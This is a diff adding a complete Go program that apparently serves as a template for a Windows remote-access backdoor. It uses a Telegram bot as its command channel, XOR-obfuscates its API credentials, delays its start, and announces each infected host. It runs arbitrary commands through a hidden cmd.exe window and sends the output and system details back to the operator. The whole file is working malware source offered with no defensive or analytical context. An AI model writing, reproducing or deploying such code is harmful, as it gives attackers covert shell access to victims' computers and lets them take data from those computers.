@@ -1,0 +1,160 @@
+package main
+
+import (
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+	"syscall"
+	"time"
+)
+
+// Credentials XOR-obfuscated at build time — no plaintext strings in binary
+var xk   = byte(TMPL_XOR_KEY)
+var eapi = []byte{TMPL_ENC_API}
+var etok = []byte{TMPL_ENC_TOKEN}
+var ecid = []byte{TMPL_ENC_CHAT}
+
+func xd(d []byte) string {
+	r := make([]byte, len(d))
+	for i, b := range d {
+		r[i] = b ^ xk
+	}
+	return string(r)
+}
+
+var (
+	apiBase = xd(eapi)
+	tok     = xd(etok)
+	cid     = xd(ecid)
+	tgURL   = apiBase + tok + "/"
+)
+
+var hc = &http.Client{Timeout: 35 * time.Second}
+
+func post(method string, body interface{}) ([]byte, error) {
+	data, _ := json.Marshal(body)
+	resp, err := hc.Post(tgURL+method, "application/json", bytes.NewReader(data))
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	return io.ReadAll(resp.Body)
+}
+
+func send(text string) {
+	if len(text) > 4000 {
+		text = text[:3990] + "\n...[truncated]"
+	}
+	post("sendMessage", map[string]interface{}{
+		"chat_id":    cid,
+		"text":       text,
+		"parse_mode": "HTML",
+	})
+}
+
+func shell(cmd string) string {
+	c := exec.Command("cmd.exe", "/c", cmd)
+	c.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
+	out, err := c.CombinedOutput()
+	s := strings.TrimSpace(string(out))
+	if err != nil && s == "" {
+		s = err.Error()
+	}
+	if s == "" {
+		s = "[no output]"
+	}
+	return s
+}
+
+func esc(s string) string {
+	s = strings.ReplaceAll(s, "&", "&amp;")
+	s = strings.ReplaceAll(s, "<", "&lt;")
+	s = strings.ReplaceAll(s, ">", "&gt;")
+	return s
+}
+
+func sysinfo() string {
+	host, _ := os.Hostname()
+	user := os.Getenv("USERNAME")
+	dir, _ := os.Getwd()
+	return fmt.Sprintf(
+		"<b>%s\\%s</b>\n<code>OS:  %s/%s\nDir: %s\nPID: %d</code>",
+		host, user, runtime.GOOS, runtime.GOARCH, dir, os.Getpid(),
+	)
+}
+
+type msg struct {
+	ID   int    `json:"update_id"`
+	M    *inner `json:"message"`
+}
+type inner struct {
+	Text string `json:"text"`
+}
+type resp struct {
+	OK     bool  `json:"ok"`
+	Result []msg `json:"result"`
+}
+
+func poll(offset int) ([]msg, int) {
+	data, err := post("getUpdates", map[string]interface{}{
+		"offset": offset, "timeout": 30, "limit": 10,
+	})
+	if err != nil {
+		return nil, offset
+	}
+	var r resp
+	if json.Unmarshal(data, &r) != nil || !r.OK {
+		return nil, offset
+	}
+	next := offset
+	for _, u := range r.Result {
+		if u.ID+1 > next {
+			next = u.ID + 1
+		}
+	}
+	return r.Result, next
+}
+
+func main() {
+	time.Sleep(TMPL_SLEEP * time.Second)
+
+	host, _ := os.Hostname()
+	user := os.Getenv("USERNAME")
+	send(fmt.Sprintf("🟢 <b>Agent online</b>  [Go]\n<code>%s\\%s</code>", host, user))
+
+	offset := 0
+	for {
+		updates, next := poll(offset)
+		offset = next
+
+		for _, upd := range updates {
+			if upd.M == nil {
+				continue
+			}
+			txt := strings.TrimSpace(upd.M.Text)
+			if txt == "" {
+				continue
+			}
+			switch {
+			case txt == "!sysinfo" || txt == "sysinfo":
+				send(sysinfo())
+			case txt == "!exit" || txt == "exit":
+				send("🔴 Terminated.")
+				os.Exit(0)
+			case strings.HasPrefix(txt, "!"):
+				out := shell(strings.TrimPrefix(txt, "!"))
+				send("<code>" + esc(out) + "</code>")
+			}
+		}
+
+		if len(updates) == 0 {
+			time.Sleep(TMPL_INTERVAL * time.Second)
+		}
+	}
+}
